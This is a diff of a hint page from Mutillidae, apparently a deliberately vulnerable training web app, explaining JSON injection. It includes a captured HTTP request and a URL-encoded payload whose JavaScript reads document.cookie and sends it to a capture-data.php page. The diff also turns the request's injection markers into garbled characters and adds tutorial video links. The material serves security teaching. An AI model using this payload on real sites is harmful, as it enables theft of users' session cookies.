@@ -55,7 +55,7 @@
 			funny symbols in this example capture.
 			<br/>
 <code>
-POST /mutillidae/index.php?page=<span class="important-code">§pen-test-tool-lookup.php§</span> HTTP/1.1
+POST /mutillidae/index.php?page=<span class="important-code">ï¿½pen-test-tool-lookup.phpï¿½</span> HTTP/1.1
 Host: localhost
 User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -65,11 +65,11 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 DNT: 1
 Proxy-Connection: keep-alive
 Referer: http://localhost/mutillidae/index.php?page=pen-test-tool-lookup.php
-Cookie: PHPSESSID=<span class="important-code">§u0at2rs1d2m69m5qm2mtqsko22§</span>
+Cookie: PHPSESSID=<span class="important-code">ï¿½u0at2rs1d2m69m5qm2mtqsko22ï¿½</span>
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 59
 
-ToolID=<span class="important-code">§7§</span>&amp;pen-test-tool-lookup-php-submit-button=<span class="important-code">§Lookup+Tool§</span>
+ToolID=<span class="important-code">ï¿½7ï¿½</span>&amp;pen-test-tool-lookup-php-submit-button=<span class="important-code">ï¿½Lookup+Toolï¿½</span>
 </code>
 			<br/>
 			<span class="report-header">JSON Injection: Finding injection point</span>
@@ -316,7 +316,13 @@ try{ var lAction = &quot;http://localhost/mutillidae/capture-data.php?cookie=&qu
 <code>
 %31%36%22%2c%20%22%70%65%6e%54%65%73%74%54%6f%6f%6c%73%22%3a%20%5b%7b%22%74%6f%6f%6c%5f%69%64%22%3a%22%31%36%22%2c%22%74%6f%6f%6c%5f%6e%61%6d%65%22%3a%22%44%69%67%22%2c%22%70%68%61%73%65%5f%74%6f%5f%75%73%65%22%3a%22%52%65%63%6f%6e%6e%61%69%73%73%61%6e%63%65%22%2c%22%74%6f%6f%6c%5f%74%79%70%65%22%3a%22%44%4e%53%20%53%65%72%76%65%72%20%51%75%65%72%79%20%54%6f%6f%6c%22%2c%22%63%6f%6d%6d%65%6e%74%22%3a%22%54%68%65%20%44%6f%6d%61%69%6e%20%49%6e%66%6f%72%6d%61%74%69%6f%6e%20%47%72%6f%70%65%72%20%69%73%20%70%72%65%66%65%72%65%64%20%6f%6e%20%4c%69%6e%75%78%20%6f%76%65%72%20%4e%53%4c%6f%6f%6b%75%70%20%61%6e%64%20%70%72%6f%76%69%64%65%73%20%6d%6f%72%65%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%20%6e%61%74%69%76%65%6c%79%2e%20%4e%53%4c%6f%6f%6b%75%70%20%6d%75%73%74%20%62%65%20%69%6e%20%64%65%62%75%67%20%6d%6f%64%65%20%74%6f%20%67%69%76%65%20%73%69%6d%69%6c%61%72%20%6f%75%74%70%75%74%2e%20%44%49%47%20%63%61%6e%20%70%65%72%66%6f%72%6d%20%7a%6f%6e%65%20%74%72%61%6e%73%66%65%72%73%20%69%66%20%74%68%65%20%44%4e%53%20%73%65%72%76%65%72%20%61%6c%6c%6f%77%73%20%74%72%61%6e%73%66%65%72%73%2e%22%7d%5d%7d%7d%20%29%3b%20%74%72%79%7b%20%76%61%72%20%6c%41%63%74%69%6f%6e%20%3d%20%22%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%2f%6d%75%74%69%6c%6c%69%64%61%65%2f%63%61%70%74%75%72%65%2d%64%61%74%61%2e%70%68%70%3f%63%6f%6f%6b%69%65%3d%22%20%2b%20%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%20%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%20%6c%58%4d%4c%48%54%54%50%2e%6f%6e%72%65%61%64%79%73%74%61%74%65%63%68%61%6e%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%7b%7d%3b%20%6c%58%4d%4c%48%54%54%50%2e%6f%70%65%6e%28%22%47%45%54%22%2c%20%6c%41%63%74%69%6f%6e%29%3b%20%6c%58%4d%4c%48%54%54%50%2e%73%65%6e%64%28%22%22%29%3b%20%7d%63%61%74%63%68%28%65%29%7b%7d%3b%2f%2f
 </code>
-	<br/><br/>
+			<br/><br/>
+			<span class="report-header">Videos</span>
+			<br/><br/>
+			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler::$SQLInjectionviaAJAXrequestwithJSONresponse);?>
+			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler::$WebPenTestingHTML5WebStorageusingJSONInjection);?>
+			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler::$StealingHTML5StorageviaJSONInjection);?>
+			<br/><br/>
 		</td>
 	</tr>
 </table>
